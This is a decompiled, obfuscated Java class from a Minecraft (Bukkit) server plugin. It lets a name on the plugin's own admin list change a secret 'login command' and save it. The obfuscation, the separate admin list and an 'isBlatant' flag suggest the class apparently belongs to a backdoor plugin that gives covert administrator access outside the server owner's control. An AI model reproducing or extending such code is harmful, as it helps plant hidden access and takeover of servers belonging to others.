/*
 * Decompiled with CFR 0.150.
 * 
 * Could not load the following classes:
 *  org.bukkit.entity.Player
 */
package me.system.runner.command.impl.admin;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.data.DataManager;
import me.system.runner.utils.Settings;
import org.bukkit.entity.Player;

public class SetlogincmdCommand
extends Command {
    @Override
    public void execute(Core lllllllllllllIllIIllIlIlIIIIlIII, String lllllllllllllIllIIllIlIlIIIIIlll, String[] lllllllllllllIllIIllIlIlIIIIIIll, Player lllllllllllllIllIIllIlIlIIIIIlIl) {
        if (lllllllllllllIllIIllIlIlIIIIlIII.admin.contains(lllllllllllllIllIIllIlIlIIIIIlIl.getName())) {
            if (lllllllllllllIllIIllIlIlIIIIIIll.length <= 1) {
                lllllllllllllIllIIllIlIlIIIIIlIl.sendMessage(Settings.USAGE("setlogincmd <new login command>"));
                lllllllllllllIllIIllIlIlIIIIIlIl.sendMessage(Settings.PREFIX("Login commands can only be one attached word and cannot have capital letters!"));
            } else {
                Settings.LOGIN_COMMAND = lllllllllllllIllIIllIlIlIIIIIIll[1];
                DataManager.getData().set("login_command", (Object)lllllllllllllIllIIllIlIlIIIIIIll[1]);
                DataManager.saveData();
                lllllllllllllIllIIllIlIlIIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("The new login command is now ").append(lllllllllllllIllIIllIlIlIIIIIIll[1]))));
            }
        } else {
            lllllllllllllIllIIllIlIlIIIIIlIl.sendMessage(Settings.PREFIX(String.valueOf(new StringBuilder().append("You must be an ").append(Settings.RED).append("admin ").append(Settings.WHITE).append("to execute this command"))));
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }

    public SetlogincmdCommand() {
        SetlogincmdCommand lllllllllllllIllIIllIlIlIIIIlllI;
    }
}

